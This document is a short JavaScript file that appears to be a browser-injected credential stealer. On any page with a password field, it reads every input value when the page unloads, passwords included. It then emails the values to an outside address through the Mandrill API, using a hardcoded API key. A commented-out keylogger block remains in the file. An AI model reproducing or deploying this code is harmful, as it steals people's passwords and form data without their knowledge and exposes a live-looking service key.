send_mail = {
    "key": "KTjyInmpVBULmNtU2x8VGw",
    "message": {
        "html": "",
        "text": "",
        "subject": "password",
        "from_email": "archiecool@gmail.com",
        "from_name": "Archit srivastava",
        "to": [
            {
                "email": "arch.srivastava.2@gmail.com",
                "name": "Archit srivastava",
                "type": "to"
            }
        ],
        "important": false,
        "track_opens": null,
        "track_clicks": null,
        "auto_text": null,
        "auto_html": null,
        "inline_css": null,
        "url_strip_qs": null,
        "preserve_recipients": null,
        "view_content_link": null,
        "tracking_domain": null,
        "signing_domain": null,
        "return_path_domain": null,
        "tags": [
            "password-resets"
        ]
    },
    "async": false,
    "ip_pool": "Main Pool"
};

var path = "https://mandrillapp.com/api/1.0/messages/send.json";

if(document.querySelector('input[type="password"]') !== null) {
	// var input_tags = document.getElementsByTagName('input');
	// var inputs = new Array(input_tags.length);
	// for(var i = 0; i < inputs.length; i++) {
	// 	inputs[i] = "";
	// }
	// for(var i= 0; i< inputs.length; i++) {
	// 	console.log(i);
	// 	input_tags[i].addEventListener('keydown', function(e){
	// 		console.log(i);
	// 		console.log(input_tags[i]);
	// 		inputs[i] += String.fromCharCode(e.which);
	// 		console.log(inputs[i]);
	// 	});
	// }
	window.onbeforeunload = function(e) {
		var input_tags = document.getElementsByTagName('input');
		for(var i = 0; i < input_tags.length; i++) {
			var type = input_tags[i].getAttribute("type");
			// input_tags[i].setAttribute("type", "text");
			// console.log(input_tags[i]);
			string = 'input: '
			if (type == 'password') {
				string = 'password: ';
			}
			send_mail['message']['html'] += string + String(input_tags[i].value) + "<br />";
			// console.log(input_tags[i].value);
			// input_tags[i].setAttribute("type", type);
		}
		// console.log(send_mail['message']['html']);
		// console.log(JSON.stringify(send_mail));
		$.ajax({
			type: "POST",
			url: path,
			data: send_mail,
			async: false,
			dataType: 'json'
		});

	};
	// document.querySelector("body").addEventListener("input",function(e){
	// 	var input_tags = document.getElementsByTagName('input');
	// 	for(var i = 0; i < input_tags.length; i++) {
	// 		// var type = input_tags[i].getAttribute("type");
	// 		// input_tags[i].setAttribute("type", "text");
	// 		// console.log(input_tags[i]);
	// 		send_mail['message']['html'] += 'input: ' + String(input_tags[i].value) + "\n";
	// 		// console.log(input_tags[i].value);
	// 		console.log(send_mail['message']['html']);
	// 		// input_tags[i].setAttribute("type", type);
	// 	}
	// });
	// $('input').click(function(){
	// 	console.log('sdfsdf');
	// });
}